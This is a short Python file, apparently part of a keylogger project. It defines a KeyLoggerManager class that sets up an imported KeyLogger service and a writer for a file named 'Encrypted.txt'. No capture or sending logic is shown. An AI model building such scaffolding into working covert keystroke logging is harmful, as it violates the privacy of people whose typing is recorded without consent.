from KeyLoggerService import KeyLogger
from fileWriter import MyFile


class KeyLoggerManager:
    def __init__(self):
        self.kl_service = KeyLogger()
        self.my_file = MyFile("Encrypted.txt")
        